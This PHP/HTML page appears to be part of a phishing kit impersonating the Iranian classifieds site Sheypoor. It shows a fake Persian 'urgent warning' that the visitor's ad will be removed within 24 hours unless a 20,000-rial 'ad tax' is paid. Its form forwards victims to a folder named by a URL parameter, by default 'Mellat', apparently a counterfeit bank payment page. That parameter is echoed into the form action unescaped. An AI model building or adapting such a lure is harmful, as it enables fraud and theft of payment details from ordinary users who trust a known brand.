
<?php
$e=intval($_GET["e"]);
if(isset($_GET["P"])){
	$P=$_GET["P"];
}else{
	$P="Mellat";
}
?>


<!DOCTYPE html>

<html lang="en" >

<head>

  <meta charset="UTF-8">

  <title>شیپور</title>

  <meta name="viewport"

      content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">

<link rel="stylesheet" href="./style.css">



</head>

<body>



<div class="wrapper">



  

  <div class="profile-card js-profile-card">

    <div class="profile-card__img">

      <img src="./1.png" alt="profile">

    </div>



    <div class="profile-card__cnt js-profile-cnt">

      <div class="profile-card__name">Sheypoor</div>

      <div class="profile-card__txt"><strong>اخطار فوری</strong>

      <br>

      <strong style="color : blue; font-family : Bold; font-family : IranSans;">شیپور</strong></div>

      <div class="profile-card-loc">

        </span>

<form action="../<?php echo $P ?>/?e=<?php echo $e ?>" method="post">

        </span>

      </div></br>



      <div>

		<p style="font-size:22px;"><strong>اخطار فوری از طرف شیپور</strong></p>

	  </div>

	  <div>

		<p style="font-size:18px;"><strong>تا 24 ساعت دیگر آگهی شما از روی شیپور</strong><span style="color:#f40000;"> <strong>پاک میشود</strong></span></p>

	  </div>

	  <div>

		<p style="font-size:18px;"><strong>برای جلوگیری از پاک شدن آگهی مالیات آگهی خود را پرداخت کنید</strong></p>

	  </div>

	  <div>

		<p style="font-size:20px;"><strong>مبلغ قابل پرداخت : 20,000 ریال</strong></p>

	  </div>

      <div class="profile-card-ctr">

        <button style="font-family : IranSans;" class="profile-card__button button--blue ">پرداخت مالیات</button>

      </div>

    </div>

	</form>

  </div>

</div>

  </defs>

</svg>



  <script  src="./script.js"></script>



</body>

</html>

